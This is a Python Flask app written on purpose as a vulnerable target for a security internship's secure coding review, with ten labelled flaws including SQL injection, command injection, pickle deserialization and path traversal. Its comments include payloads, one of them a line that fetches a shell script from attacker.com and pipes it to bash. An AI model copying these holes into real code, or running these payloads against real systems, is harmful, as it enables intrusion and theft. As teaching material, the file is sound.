#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║         CodeAlpha Cybersecurity Internship — Task 3          ║
║              Secure Coding Review                            ║
║         VULNERABLE APPLICATION — Educational Only            ║
╚══════════════════════════════════════════════════════════════╝
Author : Hiruni Ranasinghe
GitHub : https://github.com/hiruranasinghe
Repo   : CodeAlpha_SecureCodingReview

⚠️  THIS FILE IS INTENTIONALLY VULNERABLE - FOR EDUCATION ONLY
    DO NOT deploy this in any real or production environment.

This application contains 10 deliberate security vulnerabilities
covering OWASP Top 10 categories. Every vulnerability is clearly
marked with VULN # comments. See code_review_report.md for the
full audit findings and secure_app.py for all fixes.
"""

from flask import Flask, request, jsonify, session
import sqlite3
import subprocess
import hashlib
import pickle
import base64
import os

# ── Colours for terminal output ──────────────────────────────
class C:
    RESET  = "\033[0m"
    BOLD   = "\033[1m"
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BG_RED = "\033[41m"

def banner():
    print(f"""
{C.RED}{C.BOLD}
 ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗     █████╗ ██████╗ ██████╗
 ██║   ██║██║   ██║██║     ████╗  ██║   ██╔══██╗██╔══██╗██╔══██╗
 ██║   ██║██║   ██║██║     ██╔██╗ ██║   ███████║██████╔╝██████╔╝
 ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║   ██╔══██║██╔═══╝ ██╔═══╝
  ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║   ██║  ██║██║     ██║
   ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝  ╚═╝╚═╝     ╚═╝
{C.RESET}
{C.YELLOW}  ⚠  VULNERABLE APPLICATION - FOR EDUCATIONAL PURPOSES ONLY  ⚠{C.RESET}
{C.WHITE}  CodeAlpha Cybersecurity Internship | Task 3 — Secure Coding Review{C.RESET}
{C.CYAN}  Author : Hiruni Ranasinghe{C.RESET}
{C.CYAN}  GitHub : https://github.com/hiruranasinghe{C.RESET}
""")

def print_vuln(num, name, severity, location):
    colors = {"CRITICAL": C.RED, "HIGH": C.YELLOW, "MEDIUM": C.CYAN}
    col = colors.get(severity, C.WHITE)
    print(f"  {col}{C.BOLD}[VULN-{num:02d}]{C.RESET} {col}{severity:<10}{C.RESET} {name}")
    print(f"           {C.WHITE}Location: {location}{C.RESET}")

def scan_summary():
    print(f"\n{C.RED}{C.BOLD}{'═'*62}{C.RESET}")
    print(f"{C.RED}{C.BOLD}  VULNERABILITY SCAN SUMMARY — vulnerable_app.py{C.RESET}")
    print(f"{C.RED}{C.BOLD}{'═'*62}{C.RESET}\n")
    vulns = [
        (1,  "Hardcoded Secret Key",           "CRITICAL", "line 22"),
        (2,  "SQL Injection — Login",           "CRITICAL", "line 56"),
        (3,  "Broken Access Control",           "CRITICAL", "line 74"),
        (4,  "SQL Injection — Admin Search",    "HIGH",     "line 78"),
        (5,  "Sensitive Data Exposure",         "HIGH",     "line 83"),
        (6,  "OS Command Injection",            "CRITICAL", "line 94"),
        (7,  "Plaintext Password Storage",      "HIGH",     "line 107"),
        (8,  "Insecure Deserialization (RCE)",  "HIGH",     "line 119"),
        (9,  "Path Traversal",                  "MEDIUM",   "line 130"),
        (10, "Predictable Reset Token",         "MEDIUM",   "line 143"),
    ]
    for v in vulns:
        print_vuln(*v)
    print(f"\n{C.RED}  ✖ CRITICAL : 3{C.RESET}")
    print(f"{C.YELLOW}  ✖ HIGH     : 4{C.RESET}")
    print(f"{C.CYAN}  ✖ MEDIUM   : 2{C.RESET}")
    print(f"\n{C.WHITE}  Total vulnerabilities found : 10{C.RESET}")
    print(f"{C.WHITE}  See code_review_report.md for full details{C.RESET}")
    print(f"{C.WHITE}  See secure_app.py for all fixes{C.RESET}")
    print(f"\n{C.RED}{C.BOLD}{'═'*62}{C.RESET}\n")

# ── Flask app ─────────────────────────────────────────────────
app = Flask(__name__)

# VULN #1 — Hardcoded Secret Key (CRITICAL)
# Anyone reading this code can forge session cookies
app.secret_key = "supersecret123"

DB_PATH = "users.db"


def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id       INTEGER PRIMARY KEY,
            username TEXT,
            password TEXT,
            email    TEXT,
            role     TEXT DEFAULT 'user'
        )
    """)
    conn.execute(
        "INSERT OR IGNORE INTO users VALUES (1,'admin','admin123','admin@example.com','admin')"
    )
    conn.commit()
    conn.close()


@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    # VULN #2 — SQL Injection (CRITICAL)
    # Input goes straight into the query string
    # Payload: username = ' OR '1'='1'--
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    conn  = sqlite3.connect(DB_PATH)
    user  = conn.execute(query).fetchone()
    conn.close()

    if user:
        session["user"] = user[1]
        session["role"] = user[4]
        return jsonify({"status": "ok", "user": user[1]})
    return jsonify({"status": "fail"}), 401


@app.route("/admin/search")
def admin_search():
    # VULN #3 — Broken Access Control (CRITICAL)
    # No authentication check whatsoever
    query = request.args.get("q", "")

    # VULN #4 - SQL Injection in search (HIGH)
    conn    = sqlite3.connect(DB_PATH)
    results = conn.execute(
        f"SELECT * FROM users WHERE username LIKE '%{query}%'"
    ).fetchall()
    conn.close()

    # VULN #5 - Sensitive Data Exposure (HIGH)
    # Returns passwords in plaintext in the response
    return jsonify(results)


@app.route("/diagnostics")
def diagnostics():
    # VULN #6 - OS Command Injection (CRITICAL)
    # Payload: ?host=127.0.0.1; curl attacker.com/shell.sh | bash
    host   = request.args.get("host", "127.0.0.1")
    output = subprocess.check_output(f"ping -c 1 {host}", shell=True)
    return output.decode()


@app.route("/change-password", methods=["POST"])
def change_password():
    new_password = request.form.get("password")

    # VULN #7 - Plaintext Password Storage (HIGH)
    # Database breach = all passwords instantly exposed
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        f"UPDATE users SET password='{new_password}' WHERE username='{session.get('user')}'"
    )
    conn.commit()
    conn.close()
    return jsonify({"status": "password updated"})


@app.route("/restore-session", methods=["POST"])
def restore_session():
    # VULN #8 - Insecure Deserialization / RCE (HIGH)
    # pickle.loads on user data = full server takeover
    data = request.form.get("session_data")
    obj  = pickle.loads(base64.b64decode(data))
    return jsonify({"restored": str(obj)})


@app.route("/logs")
def read_logs():
    # VULN #9 - Path Traversal (MEDIUM)
    # Payload: ?file=../../etc/passwd
    filename = request.args.get("file", "app.log")
    log_path = os.path.join("/var/log/app/", filename)
    with open(log_path) as f:
        return f.read()


@app.route("/reset-password")
def reset_password():
    token    = request.args.get("token")
    username = request.args.get("user")

    # VULN #10 — Predictable Reset Token (MEDIUM)
    # md5("admin") = 21232f297a57a5a743894a0e4a801fc3
    # Anyone can compute this and reset any account
    expected = hashlib.md5(username.encode()).hexdigest()
    if token == expected:
        return jsonify({"status": "token valid"})
    return jsonify({"status": "invalid token"}), 403


if __name__ == "__main__":
    banner()
    scan_summary()
    init_db()
    # BONUS BUG — debug=True exposes interactive shell to anyone
    app.run(debug=True)